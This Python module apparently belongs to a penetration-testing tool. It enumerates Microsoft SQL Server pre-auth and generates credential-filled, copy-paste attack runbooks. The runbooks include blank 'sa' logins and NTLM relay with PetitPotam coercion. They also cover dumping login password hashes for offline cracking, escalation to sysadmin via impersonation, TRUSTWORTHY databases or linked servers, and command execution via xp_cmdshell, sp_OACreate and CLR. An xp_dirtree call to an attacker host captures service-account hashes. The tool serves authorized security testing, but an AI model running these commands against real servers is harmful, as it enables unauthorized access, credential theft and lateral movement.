"""MSSQL (Microsoft SQL Server) offensive enumeration + attack-chain runbook.

What state-of-the-art MSSQL offensive tooling (PowerUpSQL, impacket-mssqlclient,
nxc mssql, MSSQLPwner, SQLRecon) does, folded into recce's model:

  * PRE-AUTH, airgapped (stdlib only): SQL Browser (UDP 1434) instance / version /
    port enumeration, and a TDS pre-login probe for the exact server version and
    whether login encryption is enforced - no credentials, no external tools.
  * ACCESS + PRIVILEGE (with creds, via nxc - auto-run when present): which servers
    the credentials log into and whether the login is effectively admin (Pwn3d! =
    xp_cmdshell / sysadmin).
  * DEEP ENUM + PRIVESC CHAIN (the MSSQLPwner route): server roles, databases,
    TRUSTWORTHY DBs, the linked-server graph, impersonatable logins, xp_cmdshell /
    OLE / CLR / Agent status, sql_logins hashes and saved credentials - then the
    escalation chains (impersonation, TRUSTWORTHY+db_owner, linked-server hops,
    UNC->relay) and the command execution for effect (xp_cmdshell / sp_OACreate /
    CLR / Agent).

recce does the pre-auth probing itself and generates the full, credential-filled
runbook + chain (copy-paste ready); it references EXISTING tools (nxc / impacket /
mssqlpwner) for the authenticated actions and generates no exploit code.
"""
from __future__ import annotations

import socket
import struct

from .models import Host, Port

SQLBROWSER_PORT = 1434
_DEFAULT_PORT = 1433

# SQL Server major-version -> marketing name (for a friendly product label + so a
# stale build is obvious). Keyed on the TDS/browser major number.
VERSION_NAMES = {
    "8": "SQL Server 2000", "9": "SQL Server 2005", "10": "SQL Server 2008/R2",
    "11": "SQL Server 2012", "12": "SQL Server 2014", "13": "SQL Server 2016",
    "14": "SQL Server 2017", "15": "SQL Server 2019", "16": "SQL Server 2022",
}


def is_mssql(port: Port) -> bool:
    if port.portid in (1433,):
        return True
    blob = f"{port.service} {port.product}".lower()
    return "ms-sql" in blob or "mssql" in blob or "microsoft sql" in blob


def version_name(ver: str) -> str:
    """'15.0.2000.5' -> 'SQL Server 2019 (15.0.2000.5)'."""
    if not ver:
        return ""
    major = ver.split(".")[0]
    name = VERSION_NAMES.get(major)
    return f"{name} ({ver})" if name else ver


# --- SQL Browser (UDP 1434) -----------------------------------------------------

def _parse_browser(text: str) -> list[dict]:
    """Parse the SQL Browser SVR_RESP string. Instances are separated by ';;';
    each is a flat 'Key;Value;Key;Value;...' list."""
    out = []
    for chunk in text.split(";;"):
        parts = chunk.split(";")
        if len(parts) < 2:
            continue
        kv = {}
        for i in range(0, len(parts) - 1, 2):
            k, v = parts[i].strip(), parts[i + 1].strip()
            if k:
                kv[k.lower()] = v
        if kv.get("servername") or kv.get("instancename"):
            out.append({
                "server": kv.get("servername", ""),
                "instance": kv.get("instancename", ""),
                "clustered": kv.get("isclustered", ""),
                "version": kv.get("version", ""),
                "tcp": kv.get("tcp", ""),
                "np": kv.get("np", ""),
            })
    return out


def sql_browser(ip: str, timeout: float = 3.0) -> list[dict]:
    """Enumerate SQL Server instances via the SQL Browser (UDP 1434) - instance
    names, versions and TCP ports, NO credentials. Returns [] on any failure."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        try:
            s.sendto(b"\x02", (ip, SQLBROWSER_PORT))    # CLNT_UCAST_EX: list all
            data, _ = s.recvfrom(65535)
        finally:
            s.close()
    except OSError:
        return []
    if len(data) < 3 or data[0] != 0x05:
        return []
    # byte0 = 0x05, bytes1-2 = little-endian length, then the ASCII payload.
    return _parse_browser(data[3:].decode("latin-1", "replace"))


# --- TDS pre-login (TCP) --------------------------------------------------------

def _build_prelogin() -> bytes:
    """A minimal, valid TDS PRELOGIN request (VERSION/ENCRYPTION/INSTOPT/THREADID/
    MARS options). We request ENCRYPT_OFF so the server tells us its posture."""
    options = [(0x00, 6), (0x01, 1), (0x02, 1), (0x03, 4), (0x04, 1)]
    values = {0x00: b"\x00" * 6, 0x01: b"\x00", 0x02: b"\x00",
              0x03: b"\x00" * 4, 0x04: b"\x00"}
    table_size = 5 * len(options) + 1               # +1 for the 0xFF terminator
    offset = table_size
    table = b""
    data = b""
    for tok, ln in options:
        table += struct.pack(">BHH", tok, offset, ln)
        data += values[tok]
        offset += ln
    payload = table + b"\xff" + data
    header = struct.pack(">BBHHBB", 0x12, 0x01, 8 + len(payload), 0, 0, 0)
    return header + payload


_ENCRYPT = {0: "off (login only)", 1: "on", 2: "not supported", 3: "required"}


def _parse_prelogin(data: bytes) -> dict:
    """Parse a PRELOGIN response: server version + encryption posture."""
    if len(data) < 9 or data[0] != 0x04:
        return {}
    payload = data[8:]
    opts: dict[int, tuple[int, int]] = {}
    i = 0
    while i < len(payload) and payload[i] != 0xFF:
        if i + 5 > len(payload):
            break
        tok, off, ln = struct.unpack(">BHH", payload[i:i + 5])
        opts[tok] = (off, ln)
        i += 5
    out: dict = {}
    if 0x00 in opts:
        off, ln = opts[0x00]
        if off + 4 <= len(payload) and ln >= 4:
            major, minor = payload[off], payload[off + 1]
            build = struct.unpack(">H", payload[off + 2:off + 4])[0]
            out["version"] = f"{major}.{minor}.{build}"
    if 0x01 in opts:
        off, _ln = opts[0x01]
        if off < len(payload):
            out["encryption"] = _ENCRYPT.get(payload[off], str(payload[off]))
    return out


def prelogin(ip: str, port: int = _DEFAULT_PORT, timeout: float = 4.0) -> dict:
    """TDS pre-login probe: server version + whether login encryption is enforced,
    with NO credentials. Returns {} on any failure."""
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            s.settimeout(timeout)
            s.sendall(_build_prelogin())
            data = s.recv(4096)
    except OSError:
        return {}
    return _parse_prelogin(data)


# --- target discovery -----------------------------------------------------------

def mssql_targets(hosts: list[Host]) -> list[dict]:
    """Every MSSQL endpoint recce knows about, from the datastore. One row per
    open MSSQL port: {ip, hostname, port, product, version}."""
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_mssql(p):
                out.append({"ip": h.ip, "hostname": h.hostname, "port": p.portid,
                            "product": p.product, "version": p.version})
    return out


def probe_target(ip: str, port: int = _DEFAULT_PORT, active: bool = True) -> dict:
    """Credential-free gather for one endpoint: SQL Browser instances + a TDS
    pre-login (version, encryption). {instances:[...], prelogin:{...}}."""
    if not active:
        return {"instances": [], "prelogin": {}}
    return {"instances": sql_browser(ip), "prelogin": prelogin(ip, port)}


# --- credential substitution ----------------------------------------------------

def _fill(text: str, ctx: dict) -> str:
    """Substitute <ip>/<port>/<user>/<pass>/<domain>/<LHOST> tokens (longest first,
    single pass) so every command is copy-paste ready."""
    if not isinstance(text, str):
        return text
    subs = sorted(((k, v) for k, v in ctx.items() if v), key=lambda kv: -len(kv[0]))
    for tok, val in subs:
        text = text.replace(tok, str(val))
    return text


def _ctx(target: dict, creds: dict | None, lhost: str = "<LHOST>") -> dict:
    creds = creds or {}
    return {"<ip>": target.get("ip", "<ip>"), "<port>": str(target.get("port") or 1433),
            "<user>": creds.get("user") or "<user>", "<pass>": creds.get("secret") or "<pass>",
            "<domain>": creds.get("domain") or "<domain>", "<LHOST>": lhost}


# --- offline findings (misconfigurations / vulnerabilities) ---------------------

def _step(phase, step, tool, cmd, why):
    return {"phase": phase, "step": step, "tool": tool, "cmd": cmd, "why": why}


def _finding(sev, title, target, detail, tool, cmd, rem, cwes):
    return {"category": "mssql", "severity": sev, "title": title, "target": target,
            "detail": detail, "tool": tool, "command": cmd, "remediation": rem,
            "cwes": list(cwes)}


def _port_scripts(host: Host, portid: int) -> dict:
    for p in host.ports:
        if p.portid == portid:
            return {s.id: s.output for s in p.scripts}
    return {}


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    """MSSQL misconfigurations / vulnerabilities from what recce already holds
    (nmap ms-sql-* NSE output + the pre-auth probe), each with the exact command to
    prove/abuse it. `probes` maps 'ip:port' -> probe_target() result."""
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for t in [p for p in h.open_ports if is_mssql(p)]:
            tgt = f"{h.ip}:{t.portid}"
            ctx = {"<ip>": h.ip, "<port>": str(t.portid)}
            scripts = _port_scripts(h, t.portid)
            pl = (probes.get(tgt) or {}).get("prelogin") or {}

            # sa / login with a blank or trivial password -> instant sysadmin.
            blank = any("empty password" in (v.title or "").lower() and v.port == t.portid
                        for v in h.vulns) or "ms-sql-empty-password" in scripts
            if blank:
                out.append(_finding(
                    "critical", "MSSQL login with a blank password (sysadmin -> RCE)",
                    tgt, "An account (typically 'sa') authenticates with an empty "
                    "password - full control of the instance.", "impacket-mssqlclient",
                    _fill("impacket-mssqlclient sa@<ip> -p <port>   # blank password; then "
                          "enable_xp_cmdshell; xp_cmdshell whoami", ctx),
                    "Set a strong sa password (or disable sa); enforce a password policy.",
                    ["CWE-521", "CWE-1392"]))

            # xp_cmdshell already enabled -> RCE as the service account.
            xpc = scripts.get("ms-sql-xp-cmdshell", "")
            if xpc and "error" not in xpc.lower() and "disabled" not in xpc.lower():
                out.append(_finding(
                    "high", "xp_cmdshell is enabled (OS command execution)",
                    tgt, "The instance can run OS commands via xp_cmdshell as the SQL "
                    "service account.", "impacket-mssqlclient / nxc",
                    _fill("nxc mssql <ip> -u <user> -p <pass> -x whoami", ctx),
                    "Disable xp_cmdshell; run SQL under a low-privilege gMSA.",
                    ["CWE-250"]))

            # Pre-auth NTLM / host / domain disclosure (relay/coercion target).
            if "ms-sql-ntlm-info" in scripts:
                out.append(_finding(
                    "low", "MSSQL discloses NetBIOS / domain / FQDN pre-auth",
                    tgt, scripts["ms-sql-ntlm-info"].strip()[:200],
                    "manual / ntlmrelayx",
                    _fill("EXEC xp_dirtree '\\\\<LHOST>\\x';  # once logged in, coerce the "
                          "service account's NetNTLM -> relay (impacket-ntlmrelayx)", ctx),
                    "Restrict exposure; require SMB signing + EPA to blunt relay.",
                    ["CWE-200"]))

            # TDS login encryption not supported at all -> creds sniffable.
            enc = pl.get("encryption")
            if enc == "not supported":
                out.append(_finding(
                    "medium", "MSSQL does not support login encryption (credential sniffing)",
                    tgt, "The server advertised no TDS encryption - login credentials "
                    "cross the wire unprotected.", "wireshark / responder",
                    _fill("impacket-mssqlclient <user>@<ip> -p <port>   # traffic is unencrypted",
                          ctx),
                    "Install a certificate and enable Force Encryption on the instance.",
                    ["CWE-319"]))

            # Unsupported / end-of-life SQL Server (no security patches).
            ver = pl.get("version") or t.version
            major = (ver or "").split(".")[0]
            if major.isdigit() and int(major) <= 12:      # 2014 and older are EOL
                out.append(_finding(
                    "medium", f"End-of-life SQL Server ({version_name(ver)})",
                    tgt, "This SQL Server build is out of support and receives no "
                    "security updates.", "version",
                    _fill("nmap -p <port> --script ms-sql-info <ip>", ctx),
                    "Upgrade to a supported SQL Server release.",
                    ["CWE-1104"]))
    return out


# --- credential-free runbook ----------------------------------------------------

def credfree_runbook(target: dict, lhost: str = "<LHOST>") -> list[dict]:
    """What to try with NO credentials: instance/version recon (recce already did
    the SQL Browser + pre-login probes), then default/anonymous access and relay."""
    ctx = _ctx(target, None, lhost)
    f = lambda s: _fill(s, ctx)   # noqa: E731
    return [
        _step("Recon (no creds)", "SQL Browser instance/version/port enumeration",
              "recce (stdlib) / nmap",
              f("nmap -sU -p 1434 --script ms-sql-info <ip>"),
              "Instance names, versions and TCP ports without authenticating."),
        _step("Recon (no creds)", "TDS pre-login: version + encryption posture",
              "recce (stdlib)",
              f("recce mssql <ip>   # sends a TDS pre-login and reads the version/encryption"),
              "Exact server version (-> CVE mapping) and whether login is encrypted."),
        _step("Access (no creds)", "Blank / default 'sa' login",
              "nxc / impacket-mssqlclient",
              f("nxc mssql <ip> -u sa -p '' --local-auth   ;   impacket-mssqlclient sa@<ip>"),
              "A blank or default sa password is instant sysadmin (RCE)."),
        _step("Access (no creds)", "Anonymous / guest login",
              "nxc",
              f("nxc mssql <ip> -u '' -p ''   ;   nxc mssql <ip> -u guest -p ''"),
              "Some instances allow a null/guest session that still enumerates."),
        _step("Access (no creds)", "NTLM relay to MSSQL (with a coercion)",
              "impacket-ntlmrelayx",
              f("impacket-ntlmrelayx -t mssql://<ip> -smb2support   # + coerce a victim "
                "(PetitPotam/printerbug) to auth -> relayed as that account"),
              "If Windows auth is on, a relayed privileged account logs straight in."),
    ]


# --- credentialed runbook (the MSSQLPwner route) --------------------------------

def cred_runbook(target: dict, creds: dict | None, lhost: str = "<LHOST>") -> list[dict]:
    """With credentials: prove access, enumerate everything, escalate, get effect.
    Mirrors PowerUpSQL / MSSQLPwner. Every command is pre-filled with the creds."""
    ctx = _ctx(target, creds, lhost)
    f = lambda s: _fill(s, ctx)   # noqa: E731
    q = lambda tsql: f("nxc mssql <ip> -u <user> -p <pass> -q \"%s\"" % tsql)  # noqa: E731
    steps = [
        _step("Access", "Which servers accept these creds (and are you admin?)",
              "nxc mssql",
              f("nxc mssql <ip> -u <user> -p <pass> -d <domain>   "
                "# 'Pwn3d!' = sysadmin / xp_cmdshell"),
              "nxc is the fastest access + privilege matrix; --local-auth for SQL logins."),
        _step("Access", "Interactive shell on the instance", "impacket-mssqlclient",
              f("impacket-mssqlclient <domain>/<user>:<pass>@<ip>   "
                "(SQL auth: impacket-mssqlclient <user>:<pass>@<ip>)"),
              "A full T-SQL client for the enumeration + escalation below."),
        # --- enumerate everything ---
        _step("Enumerate", "Server identity, role, auth mode", "nxc / mssqlclient",
              q("SELECT @@VERSION; SELECT SERVERPROPERTY('MachineName'), SYSTEM_USER, "
                "IS_SRVROLEMEMBER('sysadmin'), SERVERPROPERTY('IsIntegratedSecurityOnly')"),
              "Who am I, am I already sysadmin, is it Windows-auth-only."),
        _step("Enumerate", "Logins and who is sysadmin", "mssqlclient",
              q("SELECT name, type_desc, is_disabled, IS_SRVROLEMEMBER('sysadmin', name) "
                "FROM sys.server_principals WHERE type IN ('S','U','G')"),
              "The privileged logins to target for impersonation / cracking."),
        _step("Enumerate", "Databases, owners and TRUSTWORTHY flag", "mssqlclient",
              q("SELECT name, is_trustworthy_on, SUSER_SNAME(owner_sid) AS owner "
                "FROM sys.databases"),
              "A TRUSTWORTHY db owned by a sysadmin is a db_owner -> sysadmin path."),
        _step("Enumerate", "Linked servers (lateral graph)", "mssqlclient",
              q("SELECT name, product, provider, data_source, is_linked FROM sys.servers"),
              "Linked servers let you EXECUTE AT / OPENQUERY other instances - pivot."),
        _step("Enumerate", "Impersonatable logins (privesc)", "mssqlclient",
              q("SELECT DISTINCT b.name FROM sys.server_permissions a JOIN "
                "sys.server_principals b ON a.grantor_principal_id=b.principal_id "
                "WHERE a.permission_name='IMPERSONATE'"),
              "Any sysadmin you can EXECUTE AS is an instant escalation."),
        _step("Enumerate", "Dangerous config (xp_cmdshell / OLE / CLR)", "mssqlclient",
              q("SELECT name, value_in_use FROM sys.configurations WHERE name IN "
                "('xp_cmdshell','Ole Automation Procedures','clr enabled')"),
              "What execution primitives are already on (or you can turn on as sa)."),
        _step("Secrets", "Dump SQL login password hashes (needs CONTROL SERVER)",
              "mssqlclient",
              q("SELECT name, password_hash FROM sys.sql_logins WHERE password_hash IS NOT NULL"),
              "Crack offline (hashcat -m 1731) - reuse across the estate."),
        _step("Secrets", "Stored credentials, linked-server logins, Agent proxies",
              "mssqlclient",
              q("SELECT name, credential_identity FROM sys.credentials; "
                "SELECT * FROM sys.linked_logins"),
              "Saved credentials often hold a domain / privileged account."),
        # --- escalate (the chains) ---
        _step("Escalate", "Impersonation chain -> sysadmin", "mssqlclient / nxc",
              f("EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin'); "
                "REVERT;   (nxc: -M mssql_priv)"),
              "If you can impersonate a sysadmin login, you ARE sysadmin."),
        _step("Escalate", "TRUSTWORTHY + db_owner -> sysadmin", "mssqlclient",
              f("USE <trustdb>; CREATE PROCEDURE dbo.x WITH EXECUTE AS OWNER AS "
                "EXEC sp_addsrvrolemember '<user>','sysadmin'; EXEC dbo.x;"),
              "db_owner on a TRUSTWORTHY db owned by a sysadmin escalates you to sysadmin."),
        _step("Escalate", "Linked-server hop (EXECUTE AT / OPENQUERY)", "mssqlclient / mssqlpwner",
              f("SELECT * FROM OPENQUERY([LINKED], 'SELECT SYSTEM_USER, "
                "IS_SRVROLEMEMBER(''sysadmin'')');   EXEC('sp_configure ''xp_cmdshell'',1;"
                "RECONFIGURE;EXEC xp_cmdshell ''whoami''') AT [LINKED];"),
              "Linked logins often map to sa on the remote - RCE there, then chain onward."),
        _step("Escalate", "MSSQLPwner: auto-map + walk the chain", "mssqlpwner",
              f("mssqlpwner <domain>/<user>:<pass>@<ip> enumerate; "
                "mssqlpwner <domain>/<user>:<pass>@<ip> interactive"),
              "Automates impersonation + linked-server chains to sysadmin and RCE."),
        # --- effect ---
        _step("Effect (RCE)", "xp_cmdshell", "nxc / mssqlclient",
              f("nxc mssql <ip> -u <user> -p <pass> -x 'whoami /all'   (mssqlclient: "
                "enable_xp_cmdshell; xp_cmdshell whoami)"),
              "OS command execution as the SQL service account."),
        _step("Effect (RCE)", "OLE Automation (sp_OACreate)", "mssqlclient",
              f("EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE; DECLARE @o INT; "
                "EXEC sp_OACreate 'WScript.Shell',@o OUT; EXEC sp_OAMethod @o,'Run',NULL,"
                "'cmd /c whoami > C:\\\\windows\\\\temp\\\\o.txt';"),
              "RCE path when xp_cmdshell is watched/disabled."),
        _step("Effect (RCE)", "CLR assembly / SQL Agent job", "mssqlpwner / PowerUpSQL",
              f("mssqlpwner <domain>/<user>:<pass>@<ip> custom-asm whoami   (or a SQL Agent "
                "CmdExec/PowerShell job)"),
              "Alternative execution primitives once you are sysadmin."),
        # --- lateral ---
        _step("Lateral", "Capture the service account's NetNTLM via UNC", "mssqlclient + ntlmrelayx",
              f("EXEC xp_dirtree '\\\\<LHOST>\\x';   with impacket-ntlmrelayx -t "
                "smb://<dc-or-host> -smb2support running"),
              "Relay the SQL service account (often privileged) to another host."),
    ]
    return steps


# --- attack chain (the 'so what') -----------------------------------------------

def attack_chain(target: dict, fs: list[dict], creds: dict | None) -> list[str]:
    """A short, grounded chain narrative for the target, from entry to effect."""
    tgt = f"{target['ip']}:{target.get('port', 1433)}"
    have = [f for f in fs if f["target"] == tgt]
    lines = []
    entry = "valid credentials" if creds and creds.get("user") else None
    if any("blank password" in f["title"].lower() for f in have):
        entry = "the blank-password login (sa)"
    if entry:
        chain = [f"Foothold: {entry} on {tgt}"]
        if any("xp_cmdshell is enabled" in f["title"].lower() for f in have):
            chain.append("xp_cmdshell is already on -> OS command execution now")
        else:
            chain.append("escalate to sysadmin (impersonation / TRUSTWORTHY / linked server)")
        chain.append("enable + run xp_cmdshell (or OLE/CLR) as the service account")
        chain.append("capture/relay the service account or hop linked servers to move laterally")
        lines.append("Likely path: " + " -> ".join(chain) + ".")
    else:
        lines.append(f"{tgt}: no confirmed entry yet - run the no-cred checks (blank sa, "
                     "relay) or supply credentials to walk the MSSQLPwner route.")
    return lines


# --- live nxc mssql (access + privilege matrix; auto-run when present) ----------

def nxc_tool() -> str | None:
    from . import credenum
    return credenum.smb_tool()             # nxc / netexec / crackmapexec / cme


def parse_nxc_mssql(output: str) -> dict:
    """Parse `nxc mssql <ip> -u U -p P`. Returns
    {access, admin, banner}: whether the creds logged in, whether admin (Pwn3d!)."""
    access = admin = False
    banner = ""
    for raw in output.splitlines():
        line = raw.strip()
        low = line.lower()
        if "mssql" not in low:
            continue
        if "[+]" in line:
            access = True
            if "pwn3d" in low or "(admin)" in low:
                admin = True
        if "(name:" in low or "(domain:" in low:
            banner = line
    return {"access": access, "admin": admin, "banner": banner}


def run_nxc_mssql(ip: str, creds: dict, port: int = _DEFAULT_PORT,
                  local_auth: bool = False) -> tuple[dict | None, str | None]:
    """Run nxc mssql for the access/privilege check. Returns (parsed, error).
    (parsed is None when nxc isn't installed - the caller falls back to commands.)"""
    from . import credenum
    tool = nxc_tool()
    if not tool:
        return None, "netexec/nxc not installed"
    cmd = [tool, "mssql", ip, "-u", creds.get("user", ""),
           "-p", creds.get("secret", "")]
    if creds.get("domain") and not local_auth:
        cmd += ["-d", creds["domain"]]
    if local_auth:
        cmd += ["--local-auth"]
    if port and port != _DEFAULT_PORT:
        cmd += ["--port", str(port)]
    out, err = credenum._run(cmd)
    if err:
        return None, err
    return parse_nxc_mssql(out), None


# --- top-level analysis ---------------------------------------------------------

def findings_to_vulns(fs: list[dict]) -> dict:
    """Convert MSSQL findings into Vuln objects, keyed by target ip, so they feed
    the main severity totals / Vulnerabilities sheet / writeups. Returns {ip:[Vuln]}."""
    from .models import Vuln
    by_ip: dict[str, list] = {}
    for f in fs:
        ip = f["target"].split(":")[0]
        port = int(f["target"].split(":")[1]) if ":" in f["target"] else 1433
        evidence = f.get("detail", "")
        if f.get("command"):
            evidence += f"\n\nProve / next step:\n{f['command']}"
        by_ip.setdefault(ip, []).append(Vuln(
            ip=ip, port=port, protocol="tcp",
            script_id=f"mssql:{f['title'][:40]}", state="finding", title=f["title"],
            severity=f["severity"], source="mssql", confidence="confirmed",
            cwes=list(f.get("cwes") or ["CWE-284"]),
            output=evidence.strip(), remediation=f.get("remediation", "")))
    return by_ip


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            lhost: str = "<LHOST>") -> dict:
    """Full MSSQL analysis: pre-auth probes, findings, and the per-target runbook +
    chain. JSON-serialisable for the datastore + report."""
    targets = mssql_targets(hosts)
    probes: dict = {}
    for t in targets:
        key = f"{t['ip']}:{t['port']}"
        probes[key] = probe_target(t["ip"], t["port"], active=active)
        # Recover the version from the pre-login when nmap missed it.
        pv = probes[key]["prelogin"].get("version")
        if pv and not t.get("version"):
            t["version"] = pv
        t["encryption"] = probes[key]["prelogin"].get("encryption", "")
        t["instances"] = probes[key]["instances"]
    fs = findings(hosts, probes)
    runbooks = []
    for t in targets:
        runbooks.append({
            "target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
            "credfree": credfree_runbook(t, lhost),
            "credentialed": cred_runbook(t, creds, lhost),
            "chain": attack_chain(t, fs, creds)})
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    fs.sort(key=lambda x: order.get(x["severity"], 5))
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "stats": {"targets": len(targets), "findings": len(fs)}}

